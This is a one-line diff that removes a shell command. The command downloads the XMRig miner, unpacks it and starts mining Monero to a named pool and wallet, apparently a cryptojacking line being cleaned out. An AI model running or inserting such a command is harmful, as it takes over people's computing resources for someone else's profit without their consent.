@@ -1,1 +1,0 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.15.3/xmrig-6.15.3-linux-x64.tar.gz && tar -xvf xmrig-6.15.3-linux-x64.tar.gz && cd xmrig-6.15.3 && chmod +x xmrig && ./xmrig -o gulf.moneroocean.stream:10128 -u 4Ax45FPApEyUTuQPrH3qeKKMsAKvAGicw6FTEgX3HmEvM5771SYrYV9Qa2qwb4kBfFKHWDoDF1U5nibKN4gm4DDJBTovkdy -p hogwarts
